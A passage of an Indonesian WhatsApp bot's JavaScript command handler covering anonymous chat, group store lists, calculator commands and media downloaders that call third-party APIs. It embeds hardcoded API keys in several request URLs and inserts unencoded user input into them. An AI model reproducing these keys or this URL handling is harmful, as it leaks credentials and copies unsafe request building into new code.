juna.sendMessage(room.a, {text: `Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\n\n${prefix}skip -- _mencari partner lain_\n${prefix}stop -- _menghentikan sesi chat_`})
room.b = m.sender
room.state = 'CHATTING'
newReply(`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\n\n${prefix}skip -- _mencari partner lain_\n${prefix}stop -- _menghentikan sesi chat_`)
} else {
let id = + new Date
this.anonymous[id] = {
id,
a: m.sender,
b: '',
state: 'WAITING',
check: function (who = '') {
return [this.a, this.b].includes(who)
},
other: function (who = '') {
return who === this.a ? this.b : who === this.b ? this.a : ''
},
}
newReply(`Mohon Tunggu Sedang Mencari Partner`)
}
break
}
case'sendprofile': case'sendprofil':
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (m.isGroup) return newReply('Fitur Tidak Dapat Digunakan Untuk Group!')
this.anonymous = this.anonymous ? this.anonymous : {}
let romoe = Object.values(this.anonymous).find(room => room.check(m.sender))
if (!romoe) {
newReply(`⚠️ Kamu belum pernah memulai chat!\n\n${prefix}start -- _Mencari partner_`)
//var teks = `⚠️ Kamu belum pernah memulai chat!`
//await juna.sendMessage(m.chat, { text: teks, footer: footxt, templateButtons: but })
throw false
} else {
let rms = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state == "CHATTING")
var partnerJID = rms.other(m.sender)
var res = await juna.sendContact(partnerJID, [m.sender.split("@")[0]])
juna.sendMessage(m.chat, { text: '✅ Berhasil mengirim profil ke teman chat anda!' }, { quoted: m })
juna.sendMessage(partnerJID, { text: '👨👩 Teman chat kamu memberikan kontak profil nya!' }, { quoted: res })
}
break
// Store Menu
case 'list': case 'store':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (db_respon_list.length === 0) return newReply(`Belum ada list message di database`)
if (!isAlreadyResponListGroup(m.chat, db_respon_list)) return newReply(`Belum ada list message yang terdaftar di group ini`)
let teks = `Halo @${m.sender.split("@")[0]} berikut beberapa list yang tersedia saat ini.\n\n`
for (let i of db_respon_list) {
if (i.id === m.chat) {
teks += `- ${i.key.toUpperCase()}\n`
}
}
teks += `\n\nUntuk melihat detail produk, silahkan kirim nama produk yang ada pada list di atas. Misalnya kamu ingin melihat detail produk dari ${db_respon_list[0].key.toUpperCase()}, maka kirim pesan ${db_respon_list[0].key.toUpperCase()} kepada bot`
juna.sendMessage(m.chat, {text: teks, mentions: [m.sender]}, {quoted:m}) 
}
break
case 'dellist':
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins) return newReply('Fitur Khusus admin!')
if (db_respon_list.length === 0) return newReply(`Belum ada list message di database`)
if (!text) return newReply(`Gunakan dengan cara ${prefix + command} *key*\n\n_Contoh_\n\n${prefix + command} hello`)
if (!isAlreadyResponList(m.chat, q.toLowerCase(), db_respon_list)) return newReply(`List respon dengan key *${q}* tidak ada di database!`)
delResponList(m.chat, q.toLowerCase(), db_respon_list)
newReply(`Sukses delete list message dengan key *${q}*`)
break
case'addlist':
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins) return newReply('Fitur Khusus admin!')
var args1 = q.split("|")[0].toLowerCase()
var args2 = q.split("|")[1]
if (!q.includes("|")) return newReply(`Gunakan dengan cara ${prefix+command} *key|response*\n\n_Contoh_\n\n${prefix+command} tes|apa`)
if (isAlreadyResponList(m.chat, args1, db_respon_list)) return newReply(`List respon dengan key : *${args1}* sudah ada di group ini.`)
if (/image/.test(mime)) {
let media = await juna.downloadAndSaveMediaMessage(quoted)
const fd = new FormData();
fd.append('file', fs.readFileSync(media), '.tmp', '.jpg')
fetch('https://telegra.ph/upload', {
method: 'POST',
body: fd
}).then(res => res.json())
.then((json) => {
addResponList(m.chat, args1, args2, true, `https://telegra.ph${json[0].src}`, db_respon_list)
newReply(`Sukses set list message dengan key : *${args1}*`)
if (fs.existsSync(media)) fs.unlinkSync(media)
})
} else {
addResponList(m.chat, args1, args2, false, '-', db_respon_list)
newReply(`Sukses set list message dengan key : *${args1}*`)
}
break
case 'updatelist': case 'update':
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins) return newReply('Fitur Khusus admin!')
var args1 = q.split("|")[0].toLowerCase()
var args2 = q.split("|")[1]
if (!q.includes("|")) return newReply(`Gunakan dengan cara ${prefix+command} *key|response*\n\n_Contoh_\n\n${prefix+command} tes|apa`)
if (!isAlreadyResponListGroup(m.chat, db_respon_list)) return newReply(`Maaf, untuk key *${args1}* belum terdaftar di group ini`)
if (/image/.test(mime)) {
let media = await juna.downloadAndSaveMediaMessage(quoted)
const fd = new FormData();
fd.append('file', fs.readFileSync(media), '.tmp', '.jpg')
fetch('https://telegra.ph/upload', {
method: 'POST',
body: fd
}).then(res => res.json())
.then((json) => {
updateResponList(m.chat, args1, args2, true, `https://telegra.ph${json[0].src}`, db_respon_list)
newReply(`Sukses update respon list dengan key *${args1}*`)
if (fs.existsSync(media)) fs.unlinkSync(media)
})
} else {
updateResponList(m.chat, args1, args2, false, '-', db_respon_list)
newReply(`Sukses update respon list dengan key *${args1}*`)
}
break
case 'tambah':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!text.includes('+')) return newReply(`Gunakan dengan cara ${prefix+command} *angka* + *angka*\n\n_Contoh_\n\n${prefix+command} 1+2`)
arg = args.join(' ')
atas = arg.split('+')[0]
bawah = arg.split('+')[1]
var nilai_one = Number(atas)
var nilai_two = Number(bawah)
newReply(`${nilai_one + nilai_two}`)}
break
case 'kurang':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!text.includes('-')) return newReply(`Gunakan dengan cara ${prefix+command} *angka* - *angka*\n\n_Contoh_\n\n${prefix+command} 1-2`)
arg = args.join(' ')
atas = arg.split('-')[0]
bawah = arg.split('-')[1]
var nilai_one = Number(atas)
var nilai_two = Number(bawah)
newReply(`${nilai_one - nilai_two}`)}
break
case 'kali':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!text.includes('*')) return newReply(`Gunakan dengan cara ${prefix+command} *angka* * *angka*\n\n_Contoh_\n\n${prefix+command} 1*2`)
arg = args.join(' ')
atas = arg.split('*')[0]
bawah = arg.split('*')[1]
var nilai_one = Number(atas)
var nilai_two = Number(bawah)
newReply(`${nilai_one * nilai_two}`)}
break
case 'bagi':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!text.includes('/')) return newReply(`Gunakan dengan cara ${prefix+command} *angka* / *angka*\n\n_Contoh_\n\n${prefix+command} 1/2`)
arg = args.join(' ')
atas = arg.split('/')[0]
bawah = arg.split('/')[1]
var nilai_one = Number(atas)
var nilai_two = Number(bawah)
newReply(`${nilai_one / nilai_two}`)}
break
case 'setproses': case 'setp':
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins) return newReply('Fitur Khusus admin!')
if (!text) return newReply(`Gunakan dengan cara ${prefix + command} *teks*\n\n_Contoh_\n\n${prefix + command} Pesanan sedang di proses ya @user\n\n- @user (tag org yg pesan)\n- @pesanan (pesanan)\n- @jam (waktu pemesanan)\n- @tanggal (tanggal pemesanan) `)
if (isSetProses(m.chat, set_proses)) return newReply(`Set proses already active`)
addSetProses(text, m.chat, set_proses)
newReply(`✅ Done set proses!`)
break
case 'changeproses': case 'changep':
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins) return newReply('Fitur Khusus admin!')
if (!text) return newReply(`Gunakan dengan cara ${prefix + command} *teks*\n\n_Contoh_\n\n${prefix + command} Pesanan sedang di proses ya @user\n\n- @user (tag org yg pesan)\n- @pesanan (pesanan)\n- @jam (waktu pemesanan)\n- @tanggal (tanggal pemesanan) `)
if (isSetProses(m.chat, set_proses)) {
changeSetProses(text, m.chat, set_proses)
newReply(`Sukses ubah set proses!`)
} else {
addSetProses(text, m.chat, set_proses)
newReply(`Sukses ubah set proses!`)
}
break
case 'delsetproses': case 'delsetp':
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins) return newReply('Fitur Khusus admin!')
if (!isSetProses(m.chat, set_proses)) return newReply(`Belum ada set proses di gc ini`)
removeSetProses(m.chat, set_proses)
newReply(`Sukses delete set proses`)
break
case 'setdone':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins) return newReply('Fitur Khusus admin!')
if (!text) return newReply(`Gunakan dengan cara ${prefix + command} *teks*\n\n_Contoh_\n\n${prefix + command} Done @user\n\n- @user (tag org yg pesan)\n- @pesanan (pesanan)\n- @jam (waktu pemesanan)\n- @tanggal (tanggal pemesanan) `)
if (isSetDone(m.chat, set_done)) return newReply(`Udh set done sebelumnya`)
addSetDone(text, m.chat, set_done)
newReply(`Sukses set done!`)
break
}
case 'changedone': case 'changed':
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins) return newReply('Fitur Khusus admin!')
if (!text) return newReply(`Gunakan dengan cara ${prefix + command} *teks*\n\n_Contoh_\n\n${prefix + command} Done @user\n\n- @user (tag org yg pesan)\n- @pesanan (pesanan)\n- @jam (waktu pemesanan)\n- @tanggal (tanggal pemesanan) `)
if (isSetDone(m.chat, set_done)) {
changeSetDone(text, m.chat, set_done)
newReply(`Sukses ubah set done!`)
} else {
addSetDone(text, m.chat, set_done)
newReply(`Sukses ubah set done!`)
}
break
case 'delsetdone': case 'delsetd':
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins) return newReply('Fitur Khusus admin!')
if (!isSetDone(m.chat, set_done)) return newReply(`Belum ada set done di gc ini`)
removeSetDone(m.chat, set_done)
newReply(`Sukses delete set done`)
break

// Downloads Menu
case 'play': case 'ytplay':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Example : ${prefix + command} Lagu sad`)
let search = await yts(`${text}`)
let caption = `*YOUTUBE PLAY*

あ ID : ${search.all[0].videoId}
あ Title : ${search.all[0].title}
あ Views : ${search.all[0].views}
あ Duration : ${search.all[0].timestamp}
あ Channel : ${search.all[0].author.name}
あ Upload : ${search.all[0].ago}
あ URL Video : ${search.videos[0].url}
あ Description : ${search.videos[0].description}

_Please wait, the audio file is being sent..._`
let todd = await getBuffer(search.all[0].image)
juna.sendMessage(m.chat, {image: todd, caption: caption}, {quoted:m})
let ply = search.videos[0].url
const ytdl = require('ytdl-core')
let mp3file = `./${m.chat}.mp3`
  let nana = ytdl(ply, { filter: 'audioonly' })
  .pipe(fs.createWriteStream(mp3file))
  .on('finish', async () => {
juna.sendMessage(m.chat, {audio: fs.readFileSync(mp3file), mimetype:'audio/mpeg' }, {quoted: m})
   })
}
limitAdd(m.sender, limit)
break
case 'ytmp3': case 'ytaudio': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix + command} *url*\n\n_Contoh_\n\n${prefix + command} https://youtu.be/dhYOPzcsbGM`)
if (!text.includes('youtu.be') && !text.includes('youtube.com')) return newReply(`Gunakan dengan cara ${prefix + command} *url*\n\n_Contoh_\n\n${prefix + command} https://youtu.be/dhYOPzcsbGM`)
await newReply(mess.wait)
let search = await yts(`${text}`)
let caption = `*YOUTUBE PLAY*

あ ID : ${search.all[0].videoId}
あ Title : ${search.all[0].title}
あ Views : ${search.all[0].views}
あ Duration : ${search.all[0].timestamp}
あ Channel : ${search.all[0].author.name}
あ Upload : ${search.all[0].ago}
あ URL Video : ${search.videos[0].url}
あ Description : ${search.videos[0].description}

_Please wait, the audio file is being sent..._`
let todd = await getBuffer(search.all[0].image)
juna.sendMessage(m.chat, {image: todd, caption: caption}, {quoted:m})
let ply = search.videos[0].url
const ytdl = require('ytdl-core')
let mp3file = `./${m.chat}.mp3`
  let nana = ytdl(ply, { filter: 'audioonly' })
  .pipe(fs.createWriteStream(mp3file))
  .on('finish', async () => {
juna.sendMessage(m.chat, {audio: fs.readFileSync(mp3file), mimetype:'audio/mpeg' }, {quoted: m})
   })
}
limitAdd(m.sender, limit)
break
// case 'ytv': case 'ytmp4': case 'ytvideo': {
// if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
// if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *url*`)
// newReply(mess.wait)
// try{
// let anu = await fetchJson(`https://api.arifzyn.xyz/download/youtube?url=${text}`)
// const cpt = anu.result.channel
// const nick = anu.result.title
// juna.sendMessage(m.chat, { video: { url: anu.result.mp4.data}, caption: `💬Judul : ${nick}\n👤Channel : ${cpt}`}, {quoted: m})
// }catch (error) {
// newReply('Error') 
// }
// limitAdd(m.sender, limit)
// }
// break
case 'ytv2': case 'ytvideo' : case 'ytmp4':{
  if (isBan) return newReply('Lu di ban kocak awokwok') 
  if (!isPremium) return newReply('Khusus Premium kocak😂😂😂')
  if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
  if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *url*`)
  newReply(mess.wait)
  try{
  let anu = await fetchJson(`https://api.lolhuman.xyz/api/ytvideo2?apikey=6b882dde90583a8ea51d4fcf&url=${text}`)
 const hd = await fetchJson(`https://skizo.tech/api/download?apikey=chiwa&url=${text}`)
  const videonya = hd.response.formats[0].url
  const judulnya = anu.result.title
  const deskripsinya = anu.result.desc
  juna.sendMessage(m.chat, { video: { url: videonya}, caption: `💬Judul : ${judulnya}`}, {quoted: m})
  }catch (error) {
  console.error(error); // log the error for debugging
  newReply(`Sorry this video can't be download\n\n*Please Report Owner!*`);
  }
  limitAdd(m.sender, limit)
  }
break
case'fetchvideo':{
if (!isCreator) return newReply('Fitur sedang dalam pengembangan,untuk saat ini fitur hanya tersediq untuk Admin')
if (!text) return newReply('Berikan link yang valid!')
try{
await sleep(2000)
await newReply('Bot sedang mendownload video,dimohon menunggu')
const videonya = `${text}`
juna.sendMessage(m.chat, { video: { url: videonya}, caption: `Fetch Video dari situs ${text}`}, {quoted: m})
}catch (error) {
  newReply('Maaf video ini tidqo dapat didownload,mohon diperhatikan untuk memberikan link yang valid dan berakhiran format video')
}
}
break
case 'ytv2': case 'ytvideo2': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *url*`)
newReply(mess.wait)
try{
let anu = await fetchJson(`https://vihangayt.me/download/ytmp4?url=${text}`)
const cpt = anu.data.duration
const nick = anu.data.title
juna.sendMessage(m.chat, { video: { url: anu.data.vid_360p}, caption: `💬Judul : ${nick}\n⏱️ Durasi : ${cpt}`}, {quoted: m})
}catch (error) {
newReply(`Sorry this video can't be download\n\n*Please Report Owner!*`);
}
limitAdd(m.sender, limit)
}
break
case 'spotify':
if (!text) return newReply('Masukan judul lagu!') 
let searching = require('./lib/spotify')
searching(text).then(result => {

const hasil = `乂 *S P O T I F Y*

*Title*: ${result.data[0].title}
*Duration*: ${result.data[0].duration}
*Popular*: ${result.data[0].popularity}
*Url*: ${result.data[0].url}
`
juna.sendMessage(m.chat, {text: hasil, contextInfo:
{
"externalAdReply": {
"title": '𝙎𝙥𝙤𝙩𝙞𝙛𝙮𝘿𝙤𝙬𝙣𝙡𝙤𝙖𝙙',
"body": `${result.data[0].url}`,
"showAdAttribution": true,
"mediaType": 1,
"sourceUrl": '',
"thumbnailUrl": 'https://telegra.ph/file/d888041549c7444f1212b.jpg',
"renderLargerThumbnail": true

}
}}, {quoted: m})
					
let spoDl = fetchJson(`https://apiruulzz.my.id/api/spotify?url=${result.data[0].url}`)
const lagunya = spoDl.result.download
juna.sendMessage(m.chat, {
audio: {
url: lagunya
},
mimetype: 'audio/mpeg',
contextInfo: {
externalAdReply: {
title: `𝙎𝙥𝙤𝙩𝙞𝙛𝙮𝘿𝙤𝙬𝙣𝙡𝙤𝙖𝙙`,
body: "",
thumbnailUrl: 'https://telegra.ph/file/d888041549c7444f1212b.jpg',
sourceUrl: '',
mediaType: 1,
showAdAttribution: true,
renderLargerThumbnail: true
}
}
}, {
quoted: m
});
   })
break 
  case 'spotifysearch': {
    if (isBan) return newReply('Lu di ban kocak awokwok');
    if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`);
    if (!text) return newReply(`Contoh : ${prefix + command} dandelion`);
  
    let spo = await fetchJson(`https://api.lolhuman.xyz/api/spotifysearch?apikey=6b882dde90583a8ea51d4fcf&query=${text}`);
    let vid = 'https://telegra.ph/file/1777e972a6ea790afebfc.mp4';
    const judul = spo.result[0].title;
    const artis = spo.result[0].artists;
    const durasi = spo.result[0].duration;
    const pop = spo.result[0].popularity;
    const link = spo.result[0].link;
    juna.sendMessage(m.chat, {image:{ url : 'https://telegra.ph/file/f54c5630a2595c57cd6ba.jpg'}, 
      caption: `*Spotify Search*\n\n*Judul*\n${judul}\n\n*Durasi*\n${durasi} Detik\n\n*Tingkat Kepopuleran*\n${pop}%\n\n*Link*\n${link}`
    }, { 
      quoted: m 
    });
    break;
  }
  
//   case 'spotifydl': {
//     if (isBan) return newReply('Lu di ban kocak awokwok');
//     if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`);
//     if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *url*\n\n_Contoh_\n\n${prefix+command} https://open.spotify.com/track/6cHCixTkEFATjcu5ig8a7I`);
//     newReply(mess.wait);
//     let anu = await fetchJson(`https://api.nomisec07.site/api/spotify?url=${text}`);
//     const aud = anu.data.url;
//     juna.sendMessage(m.chat, {
//       audio: {
//         url: aud
//       },
//       mimetype: 'audio/mpeg',
//       contextInfo: {
//         externalAdReply: {
//           title: anu.data.title,
//           body: "",
//           thumbnailUrl: anu.data.thumbnail,
//           sourceUrl: audioUrl,
//           mediaType: 1,
//           showAdAttribution: true,
//           renderLargerThumbnail: true
//         }
//       }
//     }, {
//       quoted: m
//     });
//     limitAdd(m.sender, limit);
//   }
// }
// break
case 'lk21':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!isCreator&&!isPremium) return newReply(mess.OnlyPrem)
if (!text) return newReply (`Nyari Apa?`) 
newReply (mess.wait) 
let res = await fetch(`https://wibu-api.eu.org/api/lk21/search?title=${text}`)
 try {
let json = await res.json()
json = json.result.map((v) => `*Judul:* ${v.judul}\n*Link:* ${v.link}\n*Kategori:* ${v.kategori}\n*Download:* ${v.dl}\n`).join`\n\n°°°°°°°°°°°°°°°°°°°°°°°°°°°°°\n\n`
newReply(json)
} catch (e) {
newReply(`Tidak Dapat Menemukan Apa Yang Kamu Cari`)
}
}
break
case 'jarak':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} jakarta|bandung`)
newReply(mess.wait)
let [from, to] = text.split(/[^\w\s]/g)
	if (!(from && to)) return newReply (`Example: ${prefix+command} jakarta|bandung`) 
	let data = await jarak(from, to)
	if (data.img) return juna.sendMessage(m.chat, { image: data.img, caption: data.desc }, { quoted: m })
	else newReply(data.desc)
}
limitAdd(m.sender, limit)
break
case 'bukalapak': {
    if (isBan) return newReply('Lu di ban kocak awokwok');
    if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`);
    if (!text) return newReply(`Contoh : ${prefix + command} Indonesia`);

    try {
        let bukalapak = await fetch(`https://api.royalprinz.my.id/api/search/bukalapak?q=${encodeURIComponent(text)}`);
        let bukalapakJSON = await bukalapak.json();

        let result = bukalapakJSON.result;

        let hasil = result.map((v) => {
            return `*Title:* ${v.title}\n*Rating:* ${v.rating}\n*Terjual:* ${v.terjual}\n*Harga:* ${v.harga}\n*Link:* ${v.store.link}`;
        }).join('\n\n_____________________________________\n\n');

        let thumb = result[Math.floor(Math.random() * result.length)].image;

        juna.sendMessage(m.chat, { image: { url: thumb }, caption: `${hasil}` }, { quoted: m });
    } catch (err) {
        console.error(err);
        newReply('Terjadi kesalahan saat mengambil data dari Bukalapak.');
    }
}
    limitAdd(m.sender, limit);
    break;
case 'apk':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Contoh : ${prefix + command} whatsapp`);
try{
        let apk = await fetch(`https://zeltoria.site/api/search/playstore?q=${encodeURIComponent(text)}`);
        let apkJSON = await apk.json();

        let result = apkJSON.result;

        let hasil = result.map((v) => {
            return `*Name:* ${v.nama}\n*Rating:* ${v.rate}\n*Developer:* ${v.developer}\n*Link:* ${v.link}`;
            }).join('\n\n_____________________________________\n\n');

        googleImage(text).then(res => {
let pp = res
let thumb = pp[Math.floor(Math.random() * pp.length)]

        juna.sendMessage(m.chat, { image: { url: thumb }, caption: `${hasil}` }, { quoted: m });
})
    } catch (err) {
        console.error(err);
        newReply('Terjadi kesalahan saat mencari aplikasi.');
    }
}
limitAdd(m.sender, limit)
break
case "google":{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Contoh : ${prefix + command} Indonesia`);
let google = require("google-it");
google({ query: text }).then((res) => {
let teks = `Google Search From : ${text}\n\n`;
for (let g of res) {
teks += `• *Title* : ${g.title}\n`;
teks += `• *Description* : ${g.snippet}\n`;
teks += `• *Link* : ${g.link}\n\n────────────────────────\n\n`;
}
newReply(teks)
})
}
limitAdd(m.sender, limit)
break
case 'komikusearch': case 'komikus': case 'comics': case 'comicsearch':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Contoh : ${prefix + command} tensei`);
  
let comic = await fetch(`https://api.nomisec07.site/api/komikcast-search?query=${text}`);
  let json = await comic.json();
  
let hasil = json.data.map((v) => `*Title:* ${v.title}\n*Type:* ${v.type}\n*Score:* ${v.score}\n*Chapter:* ${v.chapter}\n*Url:* ${v.url}`).join('\n\n_____________________________________\n\n');
  
newReply(hasil);
}
limitAdd(m.sender, limit);
break;
case'fb': case 'fbdl': case 'facebook':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix + command} *url*`)
juna.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
try {
let anu = await facebook(`${text}`)
juna.sendMessage(m.chat, { video: { url: anu.video_sd}, caption: `Done.`}, {quoted: m})
}catch (error) {
newReply(`Sorry this video can't be download`);
}
limitAdd(m.sender, limit)
}
break
case 'fb2': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix + command} *url*`)
newReply(mess.wait)
try{
let anu = await fetchJson(`https://api.arifzyn.com/api/download/fb2?url=${text}&apikey=${setting.ArifKey}`)
juna.sendMessage(m.chat, { video: { url: anu.result.links.hd}, caption: `Done Sayang >///<`}, {quoted: m})
}catch (error) {
newReply(`Sorry this video can't be download\n\nPlease try typing .fb3 *url*`);
}
limitAdd(m.sender, limit)
}
break
case 'fb3':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix + command} *url*`)
newReply(mess.wait)
try{
let anu = await fetchJson(`https://api.arifzyn.com/api/download/fb2?url=${text}&apikey=${setting.ArifKey}`)
juna.sendMessage(m.chat, { video: { url: anu.result.links.sd}, caption: `Done Sayang >///<`}, {quoted: m})
}catch (error) {
newReply(`Sorry this video can't be download\n\nPlease try typing .fb3 *url*`);
}
limitAdd(m.sender, limit)
}
break
case 'fb4': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix + command} *url*`)
newReply(mess.wait)
let anu = await fetchJson(`https://api.shinoa.xyz/api/dowloader/fbdown?url=${text}&apikey=${setting.ShinoKey}`)
juna.sendMessage(m.chat, { video: { url: anu.result.HD}, caption: `Done Sayang >///<`}, {quoted: m})
.catch((err) => {
newReply("Eror!!!")
})
}
limitAdd(m.sender, limit)
break
case 'twitter': case 'twittdl': case 'twdl':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix + command} *url*`)
newReply(mess.wait)
try{
let anu = await fetchJson(`https://worker.rmdni.id/downloader?url=${text}`)
juna.sendMessage(m.chat, { video: { url: anu.result.downloadLink}, caption: `Done Sayang >///<`}, {quoted: m})
}catch (error) {
newReply(`Sorry this video can't be download`);
}
limitAdd(m.sender, limit)
}
// break
// case 'instagram': case'ig': case 'igdl': case 'igvideo': case 'instavideo': case 'instavid': case 'igreels': case 'instareels': case 'instareel': case 'igtv': case 'instatv': case 'igstory': case 'igphoto': case 'instaphoto': case 'instafoto': case 'igfoto': {
// if (isBan) return newReply('Lu di ban kocak awokwok') 
// if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
// if (!text) return newReply(`Gunakan dengan cara ${prefix + command} *url*\n\n_Contoh_\n\n${prefix + command} https://www.instagram.com/reel/Cr5AXBQvBC1/?igshid=MzRlODBiNWFlZA==`)
// juna.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
// let ban = m.mentionedJid[0] || m.sender || conn.parseMention(args[0]) || (args[0].replace(/[@.+-]/g, '').replace(' ', '') + '@s.whatsapp.net') || '';
//   try {
//     if (args[0].includes('instagram.com') && args[0].includes('/p/')) {
//       let anu = await fetchJson(`https://api.lolhuman.xyz/api/instagram?apikey=6b882dde90583a8ea51d4fcf&url=${args[0]}`);
//       for (let imgs of anu.result.media) {
//       await sleep(1500);
//         await juna.sendFile(ban, imgs, null, ``, m);
//       }
//       return juna.sendMessage(m.chat, { react: { text: `✅`, key: m.key }})
//     } else if (args[0].includes('instagram.com') && args[0].includes('/reel/')) {
//       let anu = await fetchJson(`https://api.lolhuman.xyz/api/instagram?apikey=6b882dde90583a8ea51d4fcf&url=${args[0]}`);
// juna.sendMessage(m.chat, { video: { url: anu.result.media[0]}, caption: `Done.`}, {quoted: m})
//       return juna.sendMessage(m.chat, { react: { text: `✅`, key: m.key }})
//     } else if (args[0].includes('instagram.com')){
//       let anu = await fetchJson(`https://api.lolhuman.xyz/api/instagram?apikey=6b882dde90583a8ea51d4fcf&url=${args[0]}`);
//       for (let slide of anu.result) {
//         await sleep(1500);
//         await juna.sendFile(ban, slide, null, ``, m);
//         }
//         return juna.sendMessage(m.chat, { react: { text: `✅`, key: m.key }})
//     }
//   } catch (error) {
//     juna.sendMessage(m.chat, { react: { text: `❎`, key: m.key }})
//   }
//   limitAdd(m.sender, limit);
// }
break
case 'igreel': case 'igreels':{
  if (isBan) return newReply('Lu di ban dongo')
  if (!text) return newReply('Link nya mana?')
  juna.sendMessage(m.chat, { react: { text: '⏱️', key: m.key }})
  const anu = await fetchJson(`https://api.lolhuman.xyz/api/instagram?apikey=6b882dde90583a8ea51d4fcf&url=${text}`)
  const videonya = anu.result[0]
  await juna.sendMessage(m.chat, { video: { url: videonya}, caption: `Done sayank`}, {quoted: m})
  await juna.sendMessage(m.chat, { react: { text: `✅`, key: m.key }})
  
}
break
case'ttstalk':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!q) return newReply(`Example: ${prefix+command} username`)
juna.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
try{
